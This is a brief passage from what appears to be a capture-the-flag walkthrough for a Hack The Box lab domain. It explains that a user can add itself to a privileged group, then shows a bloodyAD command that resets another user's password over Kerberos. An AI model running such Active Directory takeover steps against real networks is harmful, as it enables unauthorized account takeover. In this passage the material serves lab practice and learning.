The user E.RODRIGUEZ@INFILTRATOR.HTB has the ability to add itself, to the group CHIEFS MARKETING@INFILTRATOR.HTB. Because of security group delegation, the members of a security group have the same privileges as that group.

By adding itself to the group, E.RODRIGUEZ@INFILTRATOR.HTB will gain the same privileges that CHIEFS MARKETING@INFILTRATOR.HTB already has.

![[Pasted image 20240904202011.png]]


```bash
bloodyAD --host "dc01.infiltrator.htb" -d "infiltrator.htb" --kerberos -u "e.rodriguez" -p 'Password123' set password "m.harris" "Password123"
```

